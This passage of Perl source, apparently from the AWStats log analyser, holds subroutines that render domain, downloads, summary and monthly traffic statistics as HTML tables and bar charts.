$_domener_p{$key} ) )\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle( \"$Message[57]: \" . int( $_domener_h{$key} ) )\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\n\t\t\t\t\"$Message[75]: \" . Format_Bytes( $_domener_k{$key} ) )\n\t\t\t  . \" />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_u += $_domener_u;\n\t\t$total_v += $_domener_v;\n\t\t$total_p += $_domener_p{$key};\n\t\t$total_h += $_domener_h{$key};\n\t\t$total_k += $_domener_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_u = $TotalUnique - $total_u;\n\tmy $rest_v = $TotalVisits - $total_v;\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif (   $rest_u > 0\n\t\t|| $rest_v > 0\n\t\t|| $rest_p > 0\n\t\t|| $rest_h > 0\n\t\t|| $rest_k > 0 )\n\t{    # All other domains (known or not)\n\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\">&nbsp;</td><td colspan=\\\"2\\\" class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowDomainsStats =~ /U/i ) { print \"<td>$rest_u</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /V/i ) { print \"<td>$rest_v</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /P/i ) { print \"<td>$rest_p</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Downloads code frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowDownloads{\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint \"$Center<a name=\\\"downloads\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( $Message[178], 19, 0, \"downloads\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[178]</th>\";\n\tif ( $ShowFileTypesStats =~ /H/i ){print \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\"\n\t\t.\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">206 $Message[57]</th>\"; }\n\tif ( $ShowFileTypesStats =~ /B/i ){\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $count = 0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\tprint \"<tr>\";\n\t\tmy $ext = Get_Extension($regext, $u);\n\t\tif ( !$ext) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$ext}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || \"&nbsp;\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($u);\n\t\tprint \"</td>\";\n\t\tif ( $ShowFileTypesStats =~ /H/i ){\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_HITS'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_206'}).\"</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /B/i ){\n\t\t\tprint \"<td>\".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/\n\t\t\t\t\t($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'}))).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t\tif ($count >= $MaxRowsInHTMLOutput){last;}\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Summary section at the top of the main page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSummary{\n\tif ($Debug) { debug( \"ShowSummary\", 2 ); }\n\t# FirstTime LastTime\n\tmy $FirstTime = 0;\n\tmy $LastTime  = 0;\n\tforeach my $key ( keys %FirstTime ) {\n\t\tmy $keyqualified = 0;\n\t\tif ( $MonthRequired eq 'all' ) { $keyqualified = 1; }\n\t\tif ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }\n\t\tif ($keyqualified) {\n\t\t\tif ( $FirstTime{$key}\n\t\t\t\t&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )\n\t\t\t{\n\t\t\t\t$FirstTime = $FirstTime{$key};\n\t\t\t}\n\t\t\tif ( $LastTime < ( $LastTime{$key} || 0 ) ) {\n\t\t\t\t$LastTime = $LastTime{$key};\n\t\t\t}\n\t\t}\n\t}\n\t\t\t\n\t#print \"$Center<a name=\\\"summary\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[128]\";\n\t&tab_head( \"$title\", 0, 0, 'month' );\n\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\tmy $NewLinkTarget = '';\n\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t}\n\n\t# Ratio\n\tmy $RatioVisits = 0;\n\tmy $RatioPages  = 0;\n\tmy $RatioHits   = 0;\n\tmy $RatioBytes  = 0;\n\tif ( $TotalUnique > 0 ) {\n\t\t$RatioVisits = int( $TotalVisits / $TotalUnique * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioPages = int( $TotalPages / $TotalVisits * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioHits = int( $TotalHits / $TotalVisits * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioBytes =\n\t\t  int( ( $TotalBytes / 1024 ) * 100 /\n\t\t\t  ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;\n\t}\n\n\tmy $colspan = 5;\n\tmy $w       = '20';\n\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t$w       = '17';\n\t\t$colspan = 6;\n\t}\n\n\t# Show first/last\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint\n\"<td class=\\\"aws\\\"><b>$Message[133]</b></td><td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\\n\";\n\tprint( $MonthRequired eq 'all'\n\t\t? \"$Message[6] $YearRequired\"\n\t\t: \"$Message[5] \"\n\t\t  . $MonthNumLib{$MonthRequired}\n\t\t  . \" $YearRequired\"\n\t);\n\tprint \"</td></tr>\\n\";\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<td class=\\\"aws\\\"><b>$Message[8]</b></td>\\n\";\n\tprint \"<td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\"\n\t  . ( $FirstTime ? Format_Date( $FirstTime, 0 ) : \"NA\" ) . \"</td>\";\n\tprint \"</tr>\\n\";\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<td class=\\\"aws\\\"><b>$Message[9]</b></td>\\n\";\n\tprint \"<td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\"\n\t  . ( $LastTime ? Format_Date( $LastTime, 0 ) : \"NA\" )\n\t  . \"</td>\\n\";\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators title row\n\tprint \"<tr>\";\n\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\tprint \"<td bgcolor=\\\"#$color_TableBGTitle\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /U/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_u\\\"\"\n\t\t  . Tooltip(2)\n\t\t  . \">$Message[11]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /V/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t  . Tooltip(1)\n\t\t  . \">$Message[10]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /P/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /H/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /B/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators values for viewed traffic\n\tprint \"<tr>\";\n\tif ( $LogType eq 'M' ) {\n\t\tprint \"<td class=\\\"aws\\\">$Message[165]</td>\";\n\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalHits).\"</b>\"\n\t\t\t  . (\n\t\t\t\t$LogType eq 'M'\n\t\t\t\t? \"\"\n\t\t\t\t: \"<br />($RatioHits&nbsp;\"\n\t\t\t\t  . lc( $Message[57] . \"/\" . $Message[12] ) . \")\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Bytes( int($TotalBytes) )\n\t\t\t  . \"</b><br />($RatioBytes&nbsp;$Message[108]/\"\n\t\t\t  . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t}\n\telse {\n\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$Message[160]&nbsp;*</td>\";\n\t\t}\n\t\tif ( $ShowSummary =~ /U/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$MonthRequired eq 'all'\n\t\t\t\t? \"<b>&lt;= \".Format_Number($TotalUnique).\"</b><br />$Message[129]\"\n\t\t\t\t: \"<b>\".Format_Number($TotalUnique).\"</b><br />&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /V/i ) {\n\t\t\tprint\n\"<td><b>\".Format_Number($TotalVisits).\"</b><br />($RatioVisits&nbsp;$Message[52])</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /P/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalPages).\"</b><br />($RatioPages&nbsp;\"\n\t\t\t  . $Message[56] . \"/\"\n\t\t\t  . $Message[12]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalHits).\"</b>\"\n\t\t\t  . (\n\t\t\t\t$LogType eq 'M'\n\t\t\t\t? \"\"\n\t\t\t\t: \"<br />($RatioHits&nbsp;\"\n\t\t\t\t  . $Message[57] . \"/\"\n\t\t\t\t  . $Message[12] . \")\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Bytes( int($TotalBytes) )\n\t\t\t  . \"</b><br />($RatioBytes&nbsp;$Message[108]/\"\n\t\t\t  . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t}\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators values for not viewed traffic values\n\tif ( $LogType eq 'M' || $LogType eq 'W' || $LogType eq 'S' ) {\n\t\tprint \"<tr>\";\n\t\tif ( $LogType eq 'M' ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$Message[166]</td>\";\n\t\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedHits).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Bytes( int($TotalNotViewedBytes) )\n\t\t\t\t  . \"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t}\n\t\telse {\n\t\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">$Message[161]&nbsp;*</td>\";\n\t\t\t}\n\t\t\tprint \"<td colspan=\\\"2\\\">&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tif ( $ShowSummary =~ /P/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedPages).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedHits).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Bytes( int($TotalNotViewedBytes) )\n\t\t\t\t  . \"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end($LogType eq 'W'\n\t\t  || $LogType eq 'S' ? \"* $Message[159]\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Monthly section on the main page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainMonthly{\n\tif ($Debug) { debug( \"ShowMonthStats\", 2 ); }\n\tprint \"$Center<a name=\\\"month\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[162]\";\n\t&tab_head( \"$title\", 0, 0, 'month' );\n\tprint \"<tr><td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\n\tmy $average_nb = my $average_u = my $average_v = my $average_p = 0;\n\tmy $average_h = my $average_k = 0;\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_v = my $max_p = my $max_h = my $max_k = 1;\n\n\t# Define total and max\n\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t$total_u += $MonthUnique{ $YearRequired . $monthix } || 0;\n\t\t$total_v += $MonthVisits{ $YearRequired . $monthix } || 0;\n\t\t$total_p += $MonthPages{ $YearRequired . $monthix }  || 0;\n\t\t$total_h += $MonthHits{ $YearRequired . $monthix }   || 0;\n\t\t$total_k += $MonthBytes{ $YearRequired . $monthix }  || 0;\n\n#if (($MonthUnique{$YearRequired.$monthix}||0) > $max_v) { $max_v=$MonthUnique{$YearRequired.$monthix}; }\n\t\tif (\n\t\t\t( $MonthVisits{ $YearRequired . $monthix } || 0 ) > $max_v )\n\t\t{\n\t\t\t$max_v = $MonthVisits{ $YearRequired . $monthix };\n\t\t}\n\n#if (($MonthPages{$YearRequired.$monthix}||0) > $max_p)  { $max_p=$MonthPages{$YearRequired.$monthix}; }\n\t\tif ( ( $MonthHits{ $YearRequired . $monthix } || 0 ) > $max_h )\n\t\t{\n\t\t\t$max_h = $MonthHits{ $YearRequired . $monthix };\n\t\t}\n\t\tif ( ( $MonthBytes{ $YearRequired . $monthix } || 0 ) > $max_k )\n\t\t{\n\t\t\t$max_k = $MonthBytes{ $YearRequired . $monthix };\n\t\t}\n\t}\n\n\t# Define average\n\t# TODO\n\n\t# Show bars for month\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ();\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\tpush @blocklabel,\n\t\t\t  \"$MonthNumLib{$monthix}\\n$YearRequired\";\n\t\t}\n\t\tmy @vallabel = (\n\t\t\t\"$Message[11]\", \"$Message[10]\",\n\t\t\t\"$Message[56]\", \"$Message[57]\",\n\t\t\t\"$Message[75]\"\n\t\t);\n\t\tmy @valcolor =\n\t\t  ( \"$color_u\", \"$color_v\", \"$color_p\", \"$color_h\",\n\t\t\t\"$color_k\" );\n\t\tmy @valmax = ( $max_v, $max_v, $max_h, $max_h, $max_k );\n\t\tmy @valtotal =\n\t\t  ( $total_u, $total_v, $total_p, $total_h, $total_k );\n\t\tmy @valaverage = ();\n\n\t\t#my @valaverage=($average_v,$average_p,$average_h,$average_k);\n\t\tmy @valdata = ();\n\t\tmy $xx      = 0;\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\t$valdata[ $xx++ ] = $MonthUnique{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthVisits{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthPages{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthHits{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthBytes{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t}\n\t\t\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",        \"month\",\n\t\t\t$ShowMonthStats, \\@blocklabel,\n\t\t\t\\@vallabel,      \\@valcolor,\n\t\t\t\\@valmax,        \\@valtotal,\n\t\t\t\\@valaverage,    \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\tif (! $graphdone)\n\t{\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\";\n\t\tprint \"<td>&nbsp;</td>\\n\";\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix  = sprintf( \"%02s\", $ix );\n\t\t\tmy $bredde_u = 0;\n\t\t\tmy $bredde_v = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_u =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthUnique{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_v =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthVisits{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthPages{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthBytes{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_k * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vu'}\\\" height=\\\"$bredde_u\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[11]: \"\n\t\t\t\t\t  . ( $MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t\t\t  || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[10]: \"\n\t\t\t\t\t  . ( $MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t\t\t  || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \"\n\t\t\t\t\t  . ( $MonthPages{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \"\n\t\t\t\t\t  . ( $MonthHits{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t$MonthBytes{ $YearRequired . $monthix }\n\t\t\t\t\t  )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show lib for month\n\t\tprint \"<tr valign=\\\"middle\\\">\";\n\n\t\t#if (!$StaticLinks) {\n\t\t#\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=12&year=\".($YearRequired-1)).\"\\\">&lt;&lt;</a></td>\";\n\t\t#}\n\t\t#else {\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t#\t\t\t\t}\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\n#\t\t\tif (!$StaticLinks) {\n#\t\t\t\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=$monthix&year=$YearRequired\").\"\\\">$MonthNumLib{$monthix}<br />$YearRequired</a></td>\";\n#\t\t\t}\n#\t\t\telse {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint \"$MonthNumLib{$monthix}<br />$YearRequired\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\n\t\t\t#\t\t\t\t\t}\n\t\t}\n\n#\t\tif (!$StaticLinks) {\n#\t\t\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=1&year=\".($YearRequired+1)).\"\\\">&gt;&gt;</a></td>\";\n#\t\t}\n#\t\telse {\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t#\t\t\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for month\n\tif ($AddDataArrayMonthStats) {\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[5]</td>\";\n\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_u\\\"\"\n\t\t\t  . Tooltip(2)\n\t\t\t  . \">$Message[11]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t\t  . Tooltip(1)\n\t\t\t  . \">$Message[10]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tfor ( my 